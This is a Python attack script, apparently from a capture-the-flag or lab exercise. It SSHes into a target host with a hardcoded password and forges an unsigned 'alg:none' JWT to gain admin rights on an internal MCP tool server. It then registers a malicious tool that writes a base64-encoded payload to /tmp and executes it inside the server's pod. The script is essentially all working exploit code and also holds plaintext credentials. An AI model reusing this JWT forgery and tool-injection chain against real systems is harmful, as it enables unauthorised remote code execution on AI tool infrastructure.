#!/usr/bin/env python3
"""Register MCP tool that writes a local script to /tmp in pod and runs it (pseudo-upload)."""
import argparse
import base64
import subprocess
import sys

HOST = "10.129.244.214"
SSH_PASS = "n1ghtm4r3_b4_n1ghtf4ll"
MCP = "http://127.0.0.1:30080"


def admin_none() -> str:
    import json
    h = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "role": "admin"}).encode()).rstrip(b"=").decode()
    return f"{h}.{p}."


def main():
    ap = argparse.ArgumentParser(description="Upload+run Python file in MCP pod via admin tool")
    ap.add_argument("script", help="Local .py to run inside MCP pod")
    ap.add_argument("--remote", default="/tmp/payload.py")
    ap.add_argument("--name", default="uploadrun")
    args = ap.parse_args()
    payload = open(args.script, "rb").read()
    b64 = base64.b64encode(payload).decode()
    code = f"""
import base64, subprocess, sys
open("{args.remote}","wb").write(base64.b64decode("{b64}"))
r=subprocess.run([sys.executable,"{args.remote}"],capture_output=True,text=True)
print(r.stdout, end="")
if r.stderr:
 print(r.stderr, end="")
sys.exit(r.returncode)
"""
    py = f"""
import json, urllib.request
adm = "{admin_none()}"
bot = json.loads(urllib.request.urlopen(urllib.request.Request(
    "{MCP}/api/v1/auth",
    data=json.dumps({{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}}).encode(),
    headers={{"Content-Type":"application/json"}}, method="POST")).read())["access_token"]
code = '''{code}'''
urllib.request.urlopen(urllib.request.Request(
    "{MCP}/api/v1/tools",
    data=json.dumps({{"name":"{args.name}","description":"upload","code":code}}).encode(),
    headers={{"Authorization":"Bearer "+adm,"Content-Type":"application/json"}}, method="POST"))
req = urllib.request.Request(
    "{MCP}/mcp",
    data=json.dumps({{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{{"name":"{args.name}","arguments":{{}}}}}}).encode(),
    headers={{"Authorization":"Bearer "+bot,"Content-Type":"application/json"}}, method="POST")
print(json.loads(urllib.request.urlopen(req).read())["result"]["content"][0]["text"])
"""
    r = subprocess.run(
        ["sshpass", "-p", SSH_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"nightfall@{HOST}", f"python3 <<'PY'\n{py}\nPY"],
        capture_output=True,
        text=True,
        timeout=180,
    )
    print(r.stdout)
    if r.stderr:
        print(r.stderr, file=sys.stderr)
    sys.exit(r.returncode)


if __name__ == "__main__":
    main()